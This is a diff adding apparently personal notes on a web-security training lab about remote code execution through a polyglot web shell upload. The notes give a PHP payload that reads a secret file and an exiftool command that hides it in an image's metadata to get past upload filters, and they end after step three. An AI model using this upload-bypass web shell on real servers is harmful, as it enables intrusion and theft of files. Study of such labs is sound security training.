@@ -372,6 +372,24 @@ raBbwWYE7pk77sdGXjeDvpzl0PTQUbBq
 <details>
   <summary>Lab: Remote code execution via polyglot web shell upload</summary>
 
+1. login as **`wineer`**
+2. now try to change photo and upload `exploit.php`
+
+```php
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+```
+
+>  but the server blocked us even if we use any techniques we've learned in previous labs.
+
+3. try to upload normal photo and edit it's exifdata and save output as `exploit.php` 
+
+```
+exiftool -Comment="<?php echo 'The_Flag{ ' . file_get_contents('/home/carlos/secret') . ' }'; ?>" test.jpg -o exploit.php
+```
+
+
+
+
 
 
 
